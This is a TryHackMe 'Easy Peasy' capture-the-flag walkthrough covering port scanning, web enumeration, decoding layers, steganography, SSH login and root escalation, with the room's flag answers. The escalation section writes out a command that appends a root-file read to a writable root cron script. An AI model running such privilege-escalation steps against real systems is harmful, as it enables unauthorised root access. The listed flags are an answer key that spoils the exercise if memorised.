# TryHackMe Easy Peasy: Complete Walkthrough

> Educational lab guide. Use these techniques only against the TryHackMe machine assigned to your account. The target IP is temporary; replace it whenever the room gives you a new one.

## 1. Room Overview

Easy Peasy combines:

- Full TCP port enumeration
- Web content discovery
- Base64 and Base62 decoding
- Hash identification and recovery
- Steganography with `steghide`
- SSH access on a nonstandard port
- ROT13 decoding
- Privilege escalation through a writable root cron script

The room has two HTTP services and SSH:

- `80/tcp`: Nginx
- `6498/tcp`: SSH
- `65524/tcp`: Apache

## 2. Task 1: Nmap Enumeration

### What the questions test

1. Whether a scan of only the default top 1,000 ports is sufficient.
2. Reading the web-server version from service detection.
3. Identifying the service on the highest-numbered open port.

A top-ports scan initially showed only port 80, but the room hides services outside the default scan range. Scan all TCP ports:

```bash
sudo nmap -sT -Pn -n -T4 --min-rate 1000 --max-retries 2 --open -p- TARGET_IP
```

`-sT` performs a TCP connect scan, `-Pn` skips unreliable host discovery, `-n` disables DNS lookups, `--open` hides closed ports, and `-p-` covers ports 1 through 65535.

Then identify versions only on the open ports:

```bash
sudo nmap -sT -Pn -n -sV -p 80,6498,65524 TARGET_IP
```

### Task 1 answers

- Open ports: `3`
- Nginx version: `1.16.1`
- Service on the highest port: `apache`

The important lesson is to distinguish **port discovery** from **service identification**. Do not infer the answer from a top-1,000-port scan when the question asks about the entire machine.

## 3. Task 2, Flag 1: Web Enumeration on Nginx

Start with the HTTP service:

```bash
gobuster dir -u http://TARGET_IP/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 10
```

The useful result is:

```text
/hidden/  (301)
```

Enumerate inside that directory:

```bash
gobuster dir -u http://TARGET_IP/hidden/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 5 --timeout 30s
```

This reveals:

```text
/hidden/whatever/  (301)
```

Request the page source:

```bash
curl -s http://TARGET_IP/hidden/whatever/
```

The page contains a hidden paragraph:

```html
<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
```

Decode the Base64 value:

```bash
printf '%s' 'ZmxhZ3tmMXJzN19mbDRnfQ==' | base64 -d
```

Output:

```text
flag{f1rs7_fl4g}
```

### Flag 1 answer

`flag{f1rs7_fl4g}`

### What this tests

- Directory enumeration
- Reading HTML source instead of only the rendered page
- Recognizing Base64 by its alphabet and padding
- Verifying a decoded value against the room's answer format

## 4. Task 2, Flag 2: Apache Robots and MD5

Inspect the second HTTP service:

```bash
curl -i http://TARGET_IP:65524/robots.txt
```

The response contains:

```text
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```

The long hexadecimal value is an MD5 digest. It is not the answer itself. Reverse the digest with an MD5 lookup/cracking tool, then check the result against the required format:

```text
flag{**_******_****}
```

### Flag 2 answer

`flag{1m_s3c0nd_fl4g}`

The custom User-Agent is a separate clue used to access the Apache content:

```bash
curl -A 'a18672860d0510e5ab6699730763b250' \
  http://TARGET_IP:65524/
```

The lesson is to treat `robots.txt` as information disclosure, not as an access-control mechanism. Also, do not confuse the User-Agent token with the flag plaintext.

## 5. Task 2, Flag 3: Apache Source Inspection

The Apache index contains a hidden paragraph and a visible flag-like comment. Extract the page and search it:

```bash
curl -s -A 'a18672860d0510e5ab6699730763b250' \
  http://TARGET_IP:65524/ | grep -Ei 'flag|encoded'
```

The page exposes:

```text
Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312}
```

### Flag 3 answer

`flag{9fdafbd64c47471a8f54cd3fc64cd312}`

It also contains this clue:

```text
its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu
```

The clue indicates Base62, not Base64.

## 6. Hidden Directory: Base62 Decoding

Use the Base62 alphabet that produces the readable result:

```text
0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
```

A short Python decoder:

```bash
python3 -c "s='ObsJmP173N2X6dOrAgEAL0Vu'; a='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; n=0; [exec('n=n*62+a.index(c)') for c in s]; out=b''; exec('while n: n,r=divmod(n,256); out=bytes([r])+out'); print(out.decode())"
```

The result is:

```text
/n0th1ng3ls3m4tt3r
```

Verify it against the live service:

```bash
curl -s http://TARGET_IP:65524/n0th1ng3ls3m4tt3r/
```

The page contains:

```html
<img src="binarycodepixabay.jpg" ...>
<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
```

### Hidden-directory answer

`/n0th1ng3ls3m4tt3r`

### What this tests

- Recognizing that an encoding clue may name Base62
- Testing Base62 alphabets rather than assuming one universal alphabet
- Validating the decoded path with an HTTP request

## 7. Recovering the Steganography Password

Download the image:

```bash
curl -fsS -o binarycodepixabay.jpg \
  http://TARGET_IP:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
```

The page's 64-character value is a GOST hash. Recover its plaintext using a GOST-capable hash lookup or cracker. The recovered password for this room is:

```text
<STEGANOGRAPHY_PASSWORD>
```

Inspect and extract the steganographic payload:

```bash
steghide info binarycodepixabay.jpg
steghide extract -sf binarycodepixabay.jpg
```

Enter `<STEGANOGRAPHY_PASSWORD>` when prompted.

The extracted file contains a username and a binary-encoded password. The recovered values are:

```text
username: boring
password: <SSH_PASSWORD>
```

### What this tests

- Identifying a hash by context and digest length
- Using a password recovered from one artifact to unlock another
- Understanding that steganography can hide a file inside an ordinary JPEG
- Recognizing binary text as an encoding layer rather than a password to guess

## 8. SSH Access and the User Flag

SSH listens on port 6498, not the default port 22:

```bash
ssh -p 6498 boring@TARGET_IP
```

Use:

```text
<SSH_PASSWORD>
```

Once logged in, inspect the home directory:

```bash
ls -la
cat user.txt
```

The user flag is ROT13-encoded. Decode it with:

```bash
printf '%s' '<rotated-value>' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

### User flag answer

`flag{n0wits33msn0rm4l}`

### What this tests

- SSH service enumeration on a nonstandard port
- Chaining credentials recovered from steganography
- Recognizing the word “rotated” as a Caesar/ROT13 clue

## 9. Privilege Escalation Through Cron

Inspect the system crontab:

```bash
cat /etc/crontab
```

The important line is:

```text
* * * * * root cd /var/www/ && sudo bash .mysecretcronjob.sh
```

Inspect the script and its permissions:

```bash
ls -l /var/www/.mysecretcronjob.sh
cat /var/www/.mysecretcronjob.sh
```

The vulnerability is the combination of:

1. The script executes as root.
2. The script is writable by the logged-in user.
3. Cron executes it every minute.

A contained lab-safe proof of root execution is to append a command that copies the hidden root flag to a readable location:

```bash
echo 'cat /root/.root.txt > /home/boring/rootflag' >> /var/www/.mysecretcronjob.sh
```

Wait for the cron interval, then read:

```bash
cat /home/boring/rootflag
```

A reverse shell is another common lab technique, but the file-copy proof is easier to audit and avoids opening an unnecessary listener.

### Root flag

The room stores the final flag in `/root/.root.txt`. Read it only after obtaining the root execution through the cron vulnerability:

```bash
cat /root/.root.txt
```

The literal root flag value was not captured in this session's terminal evidence, so retrieve and submit the value shown by the live lab rather than relying on a copied walkthrough.

### What this tests

- Reading `/etc/crontab` for privileged scheduled tasks
- Checking ownership and write permissions, not only command contents
- Understanding why a root-run writable script is a privilege-escalation path
- Choosing a controlled proof of privilege over a noisy exploit

## 10. Answer Summary

| Question | Answer |
|---|---|
| Open ports | `3` |
| Nginx version | `1.16.1` |
| Highest-port service | `apache` |
| Flag 1 | `flag{f1rs7_fl4g}` |
| Flag 2 | `flag{1m_s3c0nd_fl4g}` |
| Flag 3 | `flag{9fdafbd64c47471a8f54cd3fc64cd312}` |
| Hidden directory | `/n0th1ng3ls3m4tt3r` |
| Steganography password | `<STEGANOGRAPHY_PASSWORD>` |
| SSH password | `<SSH_PASSWORD>` |
| User flag | `flag{n0wits33msn0rm4l}` |
| Root flag | Retrieve from `/root/.root.txt` in the active lab |

## 11. Practical Lessons

- Scan all ports when the task asks for all open services.
- Use `-Pn` when ICMP or Nmap host discovery is unreliable.
- Separate fast port discovery from slower version detection.
- Treat status codes and response sizes together; uniform `NOPE` responses create Gobuster/ffuf false positives.
- Inspect source, comments, hidden elements, `robots.txt`, and response headers.
- Preserve every encoding layer: Base64, Base62, binary, and ROT13 are different transformations.
- Validate every candidate against the room's answer format before submitting.
- Check cron ownership and permissions carefully; a root scheduled task is only exploitable when the executed file can be modified.
- Lab IPs, hashes, and service state are temporary. Re-verify after restarting the machine.
